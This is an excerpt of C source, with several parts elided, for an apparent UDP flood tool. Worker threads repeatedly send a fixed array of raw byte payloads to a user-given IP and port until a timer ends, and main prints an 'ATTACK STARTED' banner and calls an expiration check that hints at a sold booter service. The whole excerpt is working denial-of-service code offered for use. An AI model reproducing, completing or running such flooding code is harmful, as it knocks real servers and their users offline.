...
void *attack(void *arg) {
    ...
    char *payloads[] = {
        "\xd9\x00", "\x00\x00", "\x00\x00", "\x00\x00", "\x00\x00", "\x00\x00", "\xd9\x00\x00",
        "\xd9\x00\x00", "\xd9\x00\x00", "\xd9\x00\x00", "\xd9\x00\x00", "\xd9\x00\x00",
        "\x72\xfe\x1d\x13\x00\x00", "\x72\xfe\x1d\x13\x00\x00", "\x72\xfe\x1d\x13\x00\x00",
        "\x72\xfe\x1d\x13\x00\x00", "\x72\xfe\x1d\x13\x00\x00", "\x30\x3a\x02\x01\x03\x30\x0f\x02\x02\x4a\x69\x02\x03\x00\x00",
        ...
        "\x30\x3a\x02\x01\x03\x30\x0f\x02\x02\x4a\x69\x02\x03\x00\x00", "\x01\x00\x00",
    ...
    while (time(NULL) <= endtime) {
        for (int i = 0; i < sizeof(payloads) / sizeof(payloads[0]); i++) {
            if (sendto(sock, payloads[i], strlen(payloads[i]), 0, (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
                perror("Send failed");
                close(sock);
                pthread_exit(NULL);
            }
...
int main(int argc, char *argv[]) {
    ...
    check_expiration(); // Check for expiration
    ...
    printf("▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n");
    printf("𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃 🔥\n\n");
    printf("     IP: %s\n", ip);
    printf("     PORT: %d\n", port);
    printf("     TIME: %d 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n\n", time);
    printf("▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n");
    ...
    for (int i = 0; i < threads; i++) {
        ...
        // Removed the printf statement that prints thread ID
    }
